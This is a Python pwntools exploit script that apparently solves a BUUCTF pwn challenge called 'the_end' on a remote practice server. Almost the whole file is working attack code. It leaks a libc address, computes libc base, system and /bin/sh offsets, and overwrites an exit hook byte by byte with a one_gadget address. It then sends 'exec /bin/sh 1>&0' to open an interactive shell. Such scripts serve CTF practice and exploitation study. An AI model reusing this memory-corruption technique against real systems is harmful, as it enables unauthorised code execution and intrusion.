from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv
import base64

def ret2libc(leak, func, search_fun, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
		search_addr = base + libc.dump(search_fun)
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + next(libc.search(b'/bin/sh'))
		search_addr = base + libc.sym[search_fun]

	return (base, system, binsh, search_addr)


s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='i386', log_level='debug')
binary = './the_end'

context.binary = binary
elf = ELF(binary)
p = remote('node4.buuoj.cn',27710) if argv[1]=='r' else process(binary)
# p = remote('node4.buuoj.cn',29924) if argv[1]=='r' else process(binary,
#             env={"LD_PRELOAD":"/home/javayuan/pwn_libc合集/Ubuntu16_32/libc-2.23_32.so"})
#替换libc和ld
# p = process(["/path/to/ld.so", binary],
#             env={"LD_PRELOAD":"/path/to/libc.so.6"})
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


def int2bytes(content):
	return bytes(str(content),encoding='utf-8')
def dbg():
	gdb.attach(p)
	pause()


# start


one_gadget = [0x4f2c5,0x4f322,0x10a38c]

ru(b'0x')
sleep_addr = int(str(r(12),encoding='utf-8'),16)
print(hex(sleep_addr))
base, system_addr, bin_sh_addr, stderr = ret2libc(sleep_addr,'sleep','_IO_2_1_stderr_','/home/javayuan/pwn_libc合集/Ubuntu18_64/libc-2.27.so')
log.success('libc:',hex(base))

exit_hook = base + 0x619060 + 3848 #exit_hook在libc2.23中的固定偏移（可动态调出来）
one_gadget = one_gadget[1] + base


# for i in range(5):
# 	sl(p64(exit_hook+i))
# 	sl(p8((one_gadget>>(8*i))& 0xff))

for i in range(5):
	s(p64(exit_hook+i))
	s(p8((one_gadget>>(8*i))& 0xff))
sl(b'exec /bin/sh 1>&0')
itr()